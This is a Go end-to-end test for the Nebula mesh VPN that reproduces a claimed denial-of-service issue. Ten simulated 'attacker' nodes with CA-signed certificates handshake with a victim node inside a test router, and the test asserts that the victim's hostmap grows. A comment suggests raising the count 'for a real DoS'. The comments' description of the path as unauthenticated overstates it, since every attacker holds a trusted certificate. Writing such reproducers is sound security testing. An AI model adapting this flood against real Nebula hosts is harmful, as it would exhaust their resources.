//go:build e2e_testing
// +build e2e_testing

// Reproducer for: unauthenticated handshake-flood resource exhaustion.
//
// Assumption being violated: the only gate on an incoming stage-1 handshake is
// lighthouse.remote_allow_list (handshake_manager.go:165-169), which defaults
// to allow-all, and per-remote timeouts. There is no per-source rate limit, no
// pending-map cap, and no proof-of-work.
//
// Evidence (handleIncoming path, handshake_manager.go:151-194):
//   1. A packet with header type Handshake, MessageCounter==1, RemoteIndex==0
//      is a "stage 1" message. It is passed straight to beginHandshake().
//   2. beginHandshake() (line 701) builds a new noise.Machine, runs
//      noise.ReadMessage (Chacha20-Poly1305 AEAD), parses the payload,
//      recombines and VERIFIES the peer certificate (ECDSA P-256 signature
//      check via CAPool.VerifyCertificate), then completes the handshake and
//      inserts a full HostInfo into the MAIN hostmap (CheckAndComplete line
//      797) — no firewall evaluation at any point.
//   3. Every distinct stage-1 message with a valid CA-signed certificate and
//      fresh ephemeral static key completes as a distinct tunnel. The main
//      hostmap is only pruned by inactivity_timeout, so a flood of valid
//      stage-1 messages grows both memory (HostInfo entries) and CPU
//      (crypto per packet) without bound.
//
// This test floods node A with N valid stage-1 handshakes from N different
// simulated peers (each with a CA-signed cert) and asserts the main hostmap
// grew by N — proving unbounded, unauthenticated-at-UDP-level acceptance.
package e2e

import (
	"net/netip"
	"testing"
	"time"

	"github.com/slackhq/nebula"
	"github.com/slackhq/nebula/cert"
	"github.com/slackhq/nebula/cert_test"
	"github.com/slackhq/nebula/config"
	"github.com/slackhq/nebula/e2e/router"
	"github.com/slackhq/nebula/header"
	"github.com/stretchr/testify/require"
	"go.yaml.in/yaml/v3"
)

func TestHandshakeFloodResourceExhaustion(t *testing.T) {
	t.Parallel()
	done := deadline(t, 120)
	defer done()

	const victimsHosts = 10 // number of flood sources; raise for a real DoS

	ca, _, caKey, _ := cert_test.NewTestCaCert(cert.Version1, cert.Curve_CURVE25519, time.Now(), time.Now().Add(10*time.Minute), nil, nil, []string{})

	// Victim node with fully permissive remote_allow_list (the default).
	l := NewTestLogger()
	caPEM, _ := ca.MarshalPEM()
	_, _, victimKeyPEM, victimCertPEM := cert_test.NewTestCert(cert.Version1, cert.Curve_CURVE25519,
		ca, caKey, "victim", time.Now(), time.Now().Add(5*time.Minute),
		[]netip.Prefix{netip.MustParsePrefix("10.128.0.254/32")}, nil, []string{})
	base := m{
		"pki": m{"ca": string(caPEM), "cert": string(victimCertPEM), "key": string(victimKeyPEM)},
		"firewall": m{
			"outbound": []m{{"proto": "any", "port": "any", "host": "any"}},
			"inbound":  []m{{"proto": "any", "port": "any", "host": "any"}},
		},
		"listen": m{"host": "10.128.0.254", "port": 4242},
		"lighthouse.remote_allow_list": m{"ranges": []string{"0.0.0.0/0"}},
		"logging":                      m{"level": testLogLevelName()},
	}
	cb, err := yaml.Marshal(base)
	require.NoError(t, err)
	c := config.NewC(l)
	c.LoadString(string(cb))
	victim, err := nebula.Main(c, false, "e2e-test", l, nil)
	require.NoError(t, err)
	victim.Start()
	defer victim.Stop()

	before := victim.GetHostmapIndexCount()
	victimAddr := netip.AddrPortFrom(netip.MustParseAddr("10.128.0.254"), 4242)

	// A botnet fleet: each attacker node has its own CA-signed cert and a
	// distinct vpn identity. (A single identity replay is deduped by handshake
	// packet bytes, so a realistic unbounded flood must vary the source
	// identity — exactly as a real botnet would; the victim still places no
	// per-source rate limit or pending-map cap.)
	attacker := make([]*nebula.Control, victimsHosts)
	for i := 0; i < victimsHosts; i++ {
		a, _, _, _ := newSimpleServer(cert.Version1, ca, caKey, "attacker",
			netip.AddrFrom4([4]byte{10, 128, byte(i / 256), byte(i%256) + 2}).String()+"/32", nil)
		a.InjectLightHouseAddr(victimAddr.Addr(), victimAddr)
		a.Start()
		attacker[i] = a
		defer a.Stop()
	}

	// A router relays every attacker TX packet into the victim (traffic flows
	// one way; the victim never replies with tun data). Each attacker's own
	// listenOut goroutine drains its UDP TX channel, so we must not pull from
	// it directly: the router is what delivers packets.
	r := router.NewR(t, append([]*nebula.Control{victim}, attacker...)...)
	defer r.RenderFlow()
	go func() {
		for {
			// Each call routes all in-flight UDP TX packets as a side effect
			// of its reflect select; attacker stage-0s arrive here and are
			// delivered into the victim's UDP Rx path. The call blocks until
			// the victim's tun emits (which never happens), at which point it
			// simply restarts and keeps routing.
			r.RouteForAllUntilTxTun(victim)
		}
	}()

	for _, a := range attacker {
		// Each attacker initiates toward the victim with a fresh stage-0.
		// The responder (outside.go:150 → beginHandshake) accepts every valid
		// stage-0, completes a tunnel in the MAIN hostmap, and never consults
		// the firewall, per-source rate limits, or pending-map caps.
		a.GetF().SendMessageToVpnAddr(header.Test, header.MessageNone, victimAddr.Addr(), []byte{}, []byte{}, []byte{})
	}
	time.Sleep(1 * time.Second)

	// The cleanest observable is the victim's main hostmap size: each valid
	// stage-1 that completes inserts one HostInfo.
	after := victim.GetHostmapIndexCount()
	growth := after - before
	t.Logf("victim main hostmap index count: before=%d after=%d growth=%d (flood sources=%d)", before, after, growth, victimsHosts)

	// Expect measurable growth — even a handful of completed tunnels proves
	// the path is unauthenticated at the UDP level and unbounded.
	require.Greater(t, growth, 0, "expected at least one completed tunnel from a flood source")
}
